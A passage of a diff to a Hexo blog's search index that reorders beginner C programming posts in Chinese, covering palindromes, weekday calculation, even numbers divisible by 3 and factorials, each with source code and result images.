-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h_h</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,m;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			j=i;</span><br><span class="line">			m=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(j)</span><br><span class="line">				&#123;</span><br><span class="line">					m=m*<span class="number">10</span>+j%<span class="number">10</span>;</span><br><span class="line">					j/=<span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">if</span>(i==m)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个范围 如：100\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	<span class="keyword">if</span>(h_h(x));</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/16/回文数/6.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -591,30 +612,6 @@
       </tags>
   </entry>
   <entry>
-    <title>星期计算</title>
-    <url>/2019/08/22/%E6%98%9F%E6%9C%9F%E8%AE%A1%E7%AE%97/</url>
-    <content><![CDATA[<h1 id="基姆拉尔森计算公式"><a href="#基姆拉尔森计算公式" class="headerlink" title="基姆拉尔森计算公式"></a>基姆拉尔森计算公式</h1><p>通过使用基姆拉尔森计算公式计算星期几！！！  </p>
-<p>W= (d+2<em>m+3</em>(m+1)/5+y+y/4-y/100+y/400+1)%7   </p>
-<p>公式中d表示日期中的日数，m表示月份数，y表示年数  </p>
-<p><strong>注意</strong>：把一月和二月看成是上一年的十三月和十四月，例：如果是2004-1-10则换算成：2003-13-10来代入公式计算。</p>
-<p>源代码：  </p>
-<a id="more"></a> 
-
-<h2 id="①："><a href="#①：" class="headerlink" title="①："></a>①：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *weekday[<span class="number">7</span>]=&#123;<span class="string">"Sunday"</span>,<span class="string">"Monday"</span>,<span class="string">"Tuesday"</span>,<span class="string">"Wednesday"</span>,<span class="string">"Thursday"</span>,<span class="string">"Friday"</span>,<span class="string">"Saturday"</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,w;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	w=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :%s\n"</span>,year,month,day,weekday[w]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="②："><a href="#②：" class="headerlink" title="②："></a>②：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,weekday;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	weekday=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :"</span>,year,month,day);</span><br><span class="line">	<span class="keyword">switch</span>(weekday)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">puts</span>(<span class="string">"Sunday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">puts</span>(<span class="string">"Monday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">puts</span>(<span class="string">"Tuesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">puts</span>(<span class="string">"Wednesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">puts</span>(<span class="string">"Thursday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">puts</span>(<span class="string">"Friday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">puts</span>(<span class="string">"Saturday"</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果： </p>
-<p><img src="//czheisenberg.github.io/2019/08/22/星期计算/x.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>提取数字或字母</title>
     <url>/2019/09/06/%E6%8F%90%E5%8F%96%E6%95%B0%E5%AD%97%E6%88%96%E5%AD%97%E6%AF%8D/</url>
     <content><![CDATA[<p>提取数字或字母  </p>
@@ -653,6 +650,30 @@
 
 <p>最终结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/08/19/最大公约数和最小公倍数/233.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>星期计算</title>
+    <url>/2019/08/22/%E6%98%9F%E6%9C%9F%E8%AE%A1%E7%AE%97/</url>
+    <content><![CDATA[<h1 id="基姆拉尔森计算公式"><a href="#基姆拉尔森计算公式" class="headerlink" title="基姆拉尔森计算公式"></a>基姆拉尔森计算公式</h1><p>通过使用基姆拉尔森计算公式计算星期几！！！  </p>
+<p>W= (d+2<em>m+3</em>(m+1)/5+y+y/4-y/100+y/400+1)%7   </p>
+<p>公式中d表示日期中的日数，m表示月份数，y表示年数  </p>
+<p><strong>注意</strong>：把一月和二月看成是上一年的十三月和十四月，例：如果是2004-1-10则换算成：2003-13-10来代入公式计算。</p>
+<p>源代码：  </p>
+<a id="more"></a> 
+
+<h2 id="①："><a href="#①：" class="headerlink" title="①："></a>①：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *weekday[<span class="number">7</span>]=&#123;<span class="string">"Sunday"</span>,<span class="string">"Monday"</span>,<span class="string">"Tuesday"</span>,<span class="string">"Wednesday"</span>,<span class="string">"Thursday"</span>,<span class="string">"Friday"</span>,<span class="string">"Saturday"</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,w;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	w=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :%s\n"</span>,year,month,day,weekday[w]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="②："><a href="#②：" class="headerlink" title="②："></a>②：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,weekday;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	weekday=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :"</span>,year,month,day);</span><br><span class="line">	<span class="keyword">switch</span>(weekday)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">puts</span>(<span class="string">"Sunday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">puts</span>(<span class="string">"Monday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">puts</span>(<span class="string">"Tuesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">puts</span>(<span class="string">"Wednesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">puts</span>(<span class="string">"Thursday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">puts</span>(<span class="string">"Friday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">puts</span>(<span class="string">"Saturday"</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果： </p>
+<p><img src="//czheisenberg.github.io/2019/08/22/星期计算/x.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -727,6 +748,25 @@
       </tags>
   </entry>
   <entry>
+    <title>能被3整除的偶数</title>
+    <url>/2019/08/17/%E8%83%BD%E8%A2%AB3%E6%95%B4%E9%99%A4%E7%9A%84%E5%81%B6%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="x-2-0-amp-amp-x-3-0"><a href="#x-2-0-amp-amp-x-3-0" class="headerlink" title="x%2==0&amp;&amp;x%3==0"></a>x%2==0&amp;&amp;x%3==0</h1><p>输入一些正整数（以0表示结束），统计并输出能被3整除的偶数的数及个数！  </p>
+<p>源代码： </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdlib.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,s=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一些正整数(以0结束)：\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;i);</span><br><span class="line">			<span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;i%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						s++;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">"%d,"</span>,i);</span><br><span class="line">					&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(s==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"————能被3整除的偶数 共%d个！\n"</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="//czheisenberg.github.io/2019/08/17/能被3整除的偶数/3.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>猴子吃桃</title>
     <url>/2019/08/24/%E7%8C%B4%E5%AD%90%E5%90%83%E6%A1%83/</url>
     <content><![CDATA[<h1 id="猴子吃桃"><a href="#猴子吃桃" class="headerlink" title="猴子吃桃"></a>猴子吃桃</h1><p>猴子第一天摘下若干个桃子，当即吃了一半，还不过瘾，又多吃了一个。第二天早上又将第一天剩下的桃子吃掉一半，有多吃了一个。以后每天早上都吃了前一天剩下的一半零一个。到第 10 天早上想再吃时，发现只剩下一个桃子了。求一共有多少个桃!</p>
@@ -767,16 +807,17 @@
       </tags>
   </entry>
   <entry>
-    <title>能被3整除的偶数</title>
-    <url>/2019/08/17/%E8%83%BD%E8%A2%AB3%E6%95%B4%E9%99%A4%E7%9A%84%E5%81%B6%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="x-2-0-amp-amp-x-3-0"><a href="#x-2-0-amp-amp-x-3-0" class="headerlink" title="x%2==0&amp;&amp;x%3==0"></a>x%2==0&amp;&amp;x%3==0</h1><p>输入一些正整数（以0表示结束），统计并输出能被3整除的偶数的数及个数！  </p>
-<p>源代码： </p>
+    <title>阶乘</title>
+    <url>/2019/08/24/%E9%98%B6%E4%B9%98/</url>
+    <content><![CDATA[<h1 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h1><p>比如 5！=5X4X3X2X1  =120</p>
+<p>6! =6X5X4X3X2X1  =720</p>
+<p>源代码：  </p>
 <a id="more"></a>
 
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdlib.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,s=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一些正整数(以0结束)：\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;i);</span><br><span class="line">			<span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>&amp;&amp;i%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						s++;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">"%d,"</span>,i);</span><br><span class="line">					&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(s==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"————能被3整除的偶数 共%d个！\n"</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,i;</span><br><span class="line">	<span class="keyword">double</span> sum=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个数：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=a;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum*=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d!=%f\n"</span>,a,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
-<p><img src="//czheisenberg.github.io/2019/08/17/能被3整除的偶数/3.jpg" alt></p>
+<p><img src="//czheisenberg.github.io/2019/08/24/阶乘/j.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -796,26 +837,6 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/07/17/选择排序/8.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>阶乘</title>
-    <url>/2019/08/24/%E9%98%B6%E4%B9%98/</url>
-    <content><![CDATA[<h1 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h1><p>比如 5！=5X4X3X2X1  =120</p>
-<p>6! =6X5X4X3X2X1  =720</p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,i;</span><br><span class="line">	<span class="keyword">double</span> sum=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个数：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=a;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum*=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d!=%f\n"</span>,a,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：</p>
-<p><img src="//czheisenberg.github.io/2019/08/24/阶乘/j.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
